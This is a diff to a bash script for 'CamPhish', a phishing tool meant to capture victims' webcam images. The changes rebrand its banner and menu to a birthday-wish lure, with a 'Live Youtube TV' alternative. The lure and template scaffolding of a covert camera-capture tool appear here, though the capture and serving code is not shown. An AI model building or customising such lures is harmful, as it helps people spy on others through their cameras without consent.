@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish For 14 Feb
+# CamPhish For HBD
 # Powered by Hat-Abm
 # Credits goes to thelinuxchoice [github.com/BD8KR3M/]
 
@@ -8,16 +8,16 @@ trap 'printf "\n";stop' 2
 banner() {
 clear  
 printf "\e[\n" 
-printf "\e[92m          █████╗  █████╗ ███╗   ███╗██████╗\e[0m\n" 
-printf "\e[92m         ██╔══██╗██╔══██╗████╗ ████║██╔══██╗\e[0m\n"
-printf "\e[92m         ██║  ╚═╝███████║██╔████╔██║██████╔╝\e[0m\n"
-printf "\e[91m         ██║  ██╗██╔══██║██║╚██╔╝██║██╔═══╝\e[0m\n"
-printf "\e[91m         ╚█████╔╝██║  ██║██║ ╚═╝ ██║██║     \e[0m\n"
-printf "\e[91m          ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     \e[0m\n"
-printf " \e[1;77m           HAT-ABM | Github.com/BD8KR3M \e[0m \n"
-printf " \e[1;77m              MOD BY- |ABM MUJAHID| \e[0m \n"
-printf "        \e[1;45m♦-BIRTHDAY WISH TO CAMERA HACKED-♦\e[0m \n"
-printf " \e[1;77m-----------------------------------------------\e[0m \n"
+printf "\e[92m        █████╗  █████╗ ███╗   ███╗██████╗\e[0m\n" 
+printf "\e[92m       ██╔══██╗██╔══██╗████╗ ████║██╔══██╗\e[0m\n"
+printf "\e[92m       ██║  ╚═╝███████║██╔████╔██║██████╔╝\e[0m\n"
+printf "\e[91m       ██║  ██╗██╔══██║██║╚██╔╝██║██╔═══╝\e[0m\n"
+printf "\e[91m       ╚█████╔╝██║  ██║██║ ╚═╝ ██║██║     \e[0m\n"
+printf "\e[91m        ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     \e[0m\n"
+printf " \e[1;77m         HAT-ABM | Github.com/BD8KR3M \e[0m \n"
+printf " \e[1;77m            MOD BY- |ABM MUJAHID| \e[0m \n"
+printf "       \e[1;45m♦-BIRTHDAY WISH TO CAMERA HACKED-♦\e[0m \n"
+printf " \e[1;77m---------------------------------------------\e[0m \n"
 
 #printf "\n"
 
@@ -149,13 +149,13 @@ banner
 camphish
 else
 printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m H B D Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;96m[\e[0m\e[1;77m+\e[0m\e[1;96m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+read -p $'\n\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m] Just Enter \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
